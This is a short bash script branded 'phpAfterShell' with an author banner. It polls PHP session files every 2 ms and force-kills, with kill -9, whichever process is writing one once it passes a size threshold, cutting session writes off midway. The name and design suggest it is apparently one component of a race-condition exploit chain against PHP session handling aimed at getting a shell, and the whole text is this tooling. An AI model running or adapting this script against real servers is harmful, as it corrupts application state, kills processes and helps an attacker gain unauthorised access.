#!/bin/bash
# agent.sh — interrupt agent, kill worker PHP mid-write
# by Cotab1mzz
set -u

if [ -t 1 ]; then
  CYAN=$'[96;1m'; MAGENTA=$'[95;1m'; RESET=$'[0m'
else
  CYAN=''; MAGENTA=''; RESET=''
fi
printf '%s' "$CYAN"
cat <<'EOF'
#####   #   #  #####
#      #   #  #   #
#      #####  #####
#      #   #  #   #
#      #   #  #   #
EOF
printf '%s' "$MAGENTA"
cat <<'EOF'
 ####  #####  #####  #####  #   #  #####  #     #     #####
#      #   #  #   #  #      #   #  #      #     #     #   #
 ###   #   #  #####  ####   #####  ####   #     #     #   #
    #  #  #   #  #   #      #  #   #      #     #     #   #
####   #   #  #   #  #####  #   #  #####  ##### ##### #####
EOF
printf '%s  phpAfterShell  |  by Cotab1mzz  |  interrupt agent%s\n\n' "$RESET" "$RESET"

THRESHOLD="${SESSION_THRESHOLD:-150000}"
POLL="${POLL_INTERVAL:-0.002}"
SESS_DIR="/var/lib/php/sessions"

echo "[agent] start threshold=${THRESHOLD} poll=${POLL}"

kill_mid_write() {
  local f="$1"
  [ -f "$f" ] || return
  local sz
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  [ "$sz" -lt "$THRESHOLD" ] && return
  local pid
  # cari pid yang lagi buka file ini
  pid=$(lsof -t "$f" 2>/dev/null | head -1)
  if [ -n "${pid:-}" ]; then
    kill -9 "$pid" 2>/dev/null && echo "[agent] KILLED pid=$pid size=$sz file=$f"
  fi
}

# PAKSA mode polling
echo "[agent] mode=polling (inotify dimatikan untuk kompatibilitas Docker cross-container)"

while true; do
  for f in "$SESS_DIR"/sess_*; do
    [ -e "$f" ] || continue
    kill_mid_write "$f"
  done
  sleep "$POLL"
done
